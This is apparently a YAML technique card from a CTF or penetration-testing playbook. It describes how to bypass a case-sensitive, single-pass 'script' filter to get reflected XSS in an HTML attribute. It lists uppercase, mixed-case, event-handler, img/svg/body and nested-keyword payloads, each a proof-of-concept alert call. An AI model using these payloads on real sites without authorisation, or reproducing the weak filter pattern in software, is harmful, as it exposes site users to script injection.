name: xss_case_sensitive_filter_bypass
category: web
tags: [xss, filter_bypass, case_sensitivity, html_attribute]
indicators:
  - "User input placed in HTML attribute value"
  - "Case-sensitive keyword filtering (lowercase only)"
  - "Pattern: re.sub(r'script', '', msg) without re.IGNORECASE"
  - "Input reflected in value=\"...\" attribute"

tricks:
  - name: "Step 1: Identify case-sensitive filter"
    when: "Found XSS filter that removes 'script'"
    how: "Check if filter is case-sensitive by testing uppercase"
    payload: |
      # Vulnerable code pattern:
      # msg = re.sub(r"script", "", msg)  # Only removes lowercase

      # Test: input 'script' -> gets removed
      # Test: input 'SCRIPT' -> passes through

  - name: "Step 2: Bypass with uppercase"
    when: "Filter only removes lowercase 'script'"
    how: "Use uppercase or mixed case to bypass"
    payload: |
      # Uppercase bypass:
      "><SCRIPT>alert('XSS')</SCRIPT>

      # Mixed case bypass:
      "><ScRiPt>alert('XSS')</ScRiPt>

      # Result: value=""><SCRIPT>alert('XSS')</SCRIPT>"

  - name: "Step 3: Alternative - Event handlers"
    when: "Script tags are blocked but events aren't"
    how: "Use HTML event handlers instead"
    payload: |
      # onfocus with autofocus:
      " onfocus=alert('XSS') autofocus="

      # onmouseover:
      " onmouseover=alert('XSS') x="

      # onclick:
      " onclick=alert('XSS') x="

  - name: "Step 4: Alternative - Other tags"
    when: "Need alternative to script tag"
    how: "Use img, svg, or other tags with event handlers"
    payload: |
      # img tag with onerror:
      "><img src=x onerror=alert('XSS')>

      # svg tag with onload:
      "><svg onload=alert('XSS')>

      # body tag with onload:
      "><body onload=alert('XSS')>

  - name: "Double encoding bypass"
    when: "Filter runs once"
    how: "Nest the filtered word so removal creates it"
    payload: |
      # If 'script' is removed once:
      # scrscriptipt -> scr[removed]ipt -> script

      "><scrscriptipt>alert('XSS')</scrscriptipt>
